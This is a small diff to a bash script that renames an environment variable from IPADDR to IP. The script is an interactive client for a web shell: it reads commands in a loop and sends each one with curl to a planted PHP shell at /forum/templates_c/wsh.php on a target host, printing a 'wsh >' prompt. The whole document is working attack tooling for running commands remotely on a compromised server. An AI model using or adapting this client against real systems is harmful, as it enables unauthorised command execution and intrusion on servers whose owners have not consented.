@@ -1,7 +1,7 @@
 #!/bin/bash
 
-if [ -z "${IPADDR}" ]; then
-    echo "IPADDR env var is missing";
+if [ -z "${IP}" ]; then
+    echo "IP env var is missing";
     exit 1;
 fi
 
@@ -13,7 +13,7 @@ while IFS= read -r cmd; do
         echo "Bye";
         exit 1;
     fi
-    curl -ks --get "https://$IPADDR/forum/templates_c/wsh.php" \
+    curl -ks --get "https://$IP/forum/templates_c/wsh.php" \
         --data-urlencode "x=$cmd";
     echo -n "wsh > ";
 done
